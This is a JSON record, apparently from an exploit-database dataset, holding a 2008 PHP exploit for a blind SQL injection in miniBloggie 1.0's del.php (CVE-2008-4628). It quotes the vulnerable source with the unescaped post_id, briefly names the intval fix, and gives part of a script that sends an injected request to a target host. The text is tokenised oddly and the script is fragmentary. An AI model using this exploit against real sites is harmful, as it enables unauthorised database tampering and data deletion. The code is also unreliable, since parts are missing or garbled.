{
    "text": "ecve : CVE-2008-4628 ， title : miniBloggie 1.0 - 'del.php' Blind SQL Injection - PHP webapps Exploit ， verified : Verified ， exploit_detail :  #  ! /usr/bin/php ， <?php ， error_reporting ( 0 )  ;  ， / *  ， miniBloggie 1.0 ( del.php ) Remote Blind SQL Injection Exploit ， Author -> StAkeR aka athos - StAkeR [ at ] hotmail [ dot ] it ， Date -> 18/10/2008 ， Get -> ， File del.php ， 25. if ( isset (  $ _GET [ 'post_id' ]  )  )  $ post_id = $ _GET [ 'post_id' ]  ;  ， 26. if ( isset (  $ _GET [ 'confirm' ]  )  )  $ confirm = $ _GET [ 'confirm' ]  ;  ， 27. ， 28. if (  $ confirm=\"\" ) { ， 29. notice ( \"Confirmation\" , \"Warning : Do you want to delete this post ? <a href=del.php?post_id=\". $ post_id.\"&confirm=yes>Yes</a>\" )  ;  ， 30. } ， 31. elseif (  $ confirm=\"yes\" ) { ， 32. // Data Base Connection // ， 33. dbConnect (  )  ;  ， 34. $ sql = \"DELETE FROM blogdata WHERE post_id= $ post_id\" ;  ， 35. $ query = mysql_query (  $ sql ) or die ( \"Cannot query the database.<br>\" . mysql_error (  )  )  ;  ， 36. $ confirm =\"\" ;  ， 37. notice ( \"Del Post\" , \"Data Deleted\" )  ;  ， 38. } ， 39. else notice ( \"Delete Error , Unable to complete the task ! \" )  ;  ， 40. ?> ， NOTE :  ，  $ sql = \"DELETE FROM blogdata WHERE post_id= $ post_id\" ;  ，  $ post_id isn't escaped so you can execute SQL Code ， How to fix? sanize $ post_id with intval or int ( PHP Functions )  ，  * / ，  $ inet = explode ( ' : ' ,  $ host )  ;  ，  $ data .= \"GET / $ path/del.php?post_id={ $ evil}&confirm=yes HTTP/1.1\\r\\n\" ;  ，  $ data .= \"Host :  $ host [ 0 ] \\r\\n\" ;  ，  $ data .= \"User-Agent : Lynx ( textmode ) \\r\\n\" ;  ，  $ data .= \"Connection : close\\r\\n\\r\\n\" ;  ， fputs (  $ sock ,  $ data )  ;  ， fclose (  $ sock )  ; ",
    "time": "2008-10-18"
}